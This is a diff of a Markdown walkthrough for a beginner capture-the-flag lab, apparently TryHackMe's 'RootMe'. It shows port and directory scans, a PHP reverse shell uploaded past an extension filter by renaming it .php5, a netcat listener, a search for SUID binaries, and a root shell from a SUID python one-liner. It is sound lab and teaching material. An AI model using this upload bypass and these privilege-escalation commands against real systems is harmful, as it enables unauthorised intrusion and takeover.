@@ -1,6 +1,6 @@
 # RootMe
 A ctf for beginners, can you root me?
-
+![](Images/default_tryhackme.png)
 ## Task 2
 First, let's get information about the target. Here is the **nmap** scan.
 ```
@@ -26,9 +26,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Mon Jun  7 14:53:41 2021 -- 1 IP address (1 host up) scanned in 35.82 seconds
 ```
+Seems like we got ssh port open and http port. Let's take look into that web site.
+
+![](Images/web.png)
 
 1. Scan the machine, how many ports are open?
-
 ```
  2
 ```
@@ -36,22 +38,46 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 2.4.29
 ```
-3. What service is running on port 22? 
+1. What service is running on port 22? 
 ```
 ssh
 ```
-4. What is the hidden directory?
+5. What is the hidden directory?
 
-Let's run a dirb or gobuster to find the hidden directory.
+Let's run a dirb or gobuster to find the hidden directory on our website. 
 
-dirb.scan
+```
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
 
-## Task 3
-Now we got a upload directory. We can use a php-reverse-shell.php to get a shell. 
+OUTPUT_FILE: dirb.scan
+START_TIME: Mon Jun  7 15:01:41 2021
+URL_BASE: http://10.10.88.87/
+WORDLIST_FILES: /opt/seclist/Discovery/Web-Content/raft-medium-directories.txt
+OPTION: Not Recursive
+
+-----------------
+
+GENERATED WORDS: 29984
+
+---- Scanning URL: http://10.10.88.87/ ----
+==> DIRECTORY: http://10.10.88.87/js/
+==> DIRECTORY: http://10.10.88.87/css/
+==> DIRECTORY: http://10.10.88.87/uploads/
+==> DIRECTORY: http://10.10.88.87/panel/
+```
+Seems like we got uploads and something call panel. When we take a look into that panel directory. You can see upload section. This must be our **hidden directory**.
+
 ![](Images/panel.png)
 
- We can't upload php files to this website.I tried other extensions such as jpg, and that uploaded successfully. I tried changing the magic number from PHP to jpg of “FF F8 FF DB“. That uploaded the php reverse-shell script but it won’t execute. Then, I realized maybe it is just filtering the .php extension, so I renamed the script to a .php5 extension. And that uploaded successfully too
+## Task 3
+Now we got a upload directory. We can use a php-reverse-shell to get a shell. 
 
+We can't upload php files to this website.I tried other extensions such as jpg, and that uploaded successfully. I tried changing the magic number from PHP to jpg of “FF F8 FF DB“. That uploaded the php reverse-shell script but it won’t execute. Then, I realized maybe it is just filtering the .php extension, so I renamed the script to a .php5 extension. And that uploaded successfully and executed and give me a shell. 
+
+![](Images/shell.png)
 ```bash
 ┌─[visith@parrot]─[~/CTF/thm/root_me]
 └──╼ $nc -lnvp 4444
@@ -71,28 +97,24 @@ cdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.old
 www-data@rootme:/$ 
 ```
 
+Looks like we got a lot of directories. we can go on by one and search for user.txt or you can use this find command. It will make it fast.
+```bash
 find / -type f -name user.txt 2>/dev/null
-
+```
+Let's see this find command in action.
 ```bash
 www-data@rootme:/$ find / -type f -name user.txt 2>/dev/null
 find / -type f -name user.txt 2>/dev/null
 /var/www/user.txt
 www-data@rootme:/$ cat /var/www/user.txt             
 cat /var/www/user.txt
-THM{y0u_g0t_a_sh3ll}
-
+THM{flag_here}
 ```
-find / -perm -4000 2>/dev/null
+Now we need to get to root user. In their hints they told about SUID. Let's take look into it.
 
 ```bash
 www-data@rootme:/$ find / -perm -4000 2>/dev/null
 find / -perm -4000 2>/dev/null
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/snapd/snap-confine
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-/usr/lib/policykit-1/polkit-agent-helper-1
 /usr/bin/traceroute6.iputils
 /usr/bin/newuidmap
 /usr/bin/newgidmap
@@ -104,48 +126,22 @@ find / -perm -4000 2>/dev/null
 /usr/bin/sudo
 /usr/bin/newgrp
 /usr/bin/passwd
-/usr/bin/pkexec
-/snap/core/8268/bin/mount
-/snap/core/8268/bin/ping
-/snap/core/8268/bin/ping6
-/snap/core/8268/bin/su
-/snap/core/8268/bin/umount
-/snap/core/8268/usr/bin/chfn
-/snap/core/8268/usr/bin/chsh
-/snap/core/8268/usr/bin/gpasswd
-/snap/core/8268/usr/bin/newgrp
-/snap/core/8268/usr/bin/passwd
-/snap/core/8268/usr/bin/sudo
-/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core/8268/usr/lib/openssh/ssh-keysign
-/snap/core/8268/usr/lib/snapd/snap-confine
-/snap/core/8268/usr/sbin/pppd
-/snap/core/9665/bin/mount
-/snap/core/9665/bin/ping
-/snap/core/9665/bin/ping6
-/snap/core/9665/bin/su
-/snap/core/9665/bin/umount
-/snap/core/9665/usr/bin/chfn
-/snap/core/9665/usr/bin/chsh
-/snap/core/9665/usr/bin/gpasswd
-/snap/core/9665/usr/bin/newgrp
-/snap/core/9665/usr/bin/passwd
-/snap/core/9665/usr/bin/sudo
-/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core/9665/usr/lib/openssh/ssh-keysign
-/snap/core/9665/usr/lib/snapd/snap-confine
 /snap/core/9665/usr/sbin/pppd
 /bin/mount
 /bin/su
 /bin/fusermount
 /bin/ping
 /bin/umount
-
-
 ```
-In that dirctory
-./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+Looks like python little bit sus. Let's search about python SUID execution on GTFObins. 
 
+![](Images/suid.png)
+
+Let's do it. First you need to get /usr/bin/ directory to execute our command. 
+```bash
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+Let's see it in action.
 ```bash
 www-data@rootme:/usr/bin$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 <hon -c 'import os; os.execl("/bin/sh", "sh", "-p")'
@@ -157,10 +153,11 @@ root
 /root/root.txt
 # cat /root/root.txt
 cat /root/root.txt
-THM{pr1v1l3g3_3sc4l4t10n}
+THM{Flag_here}
 # 
-
-
 ```
 
- find / -type f -name root.txt
+We pwn it... Thx for reading 
+
+
+<img src="https://tenor.com/7FNY.gif" width="40" height="40"/>
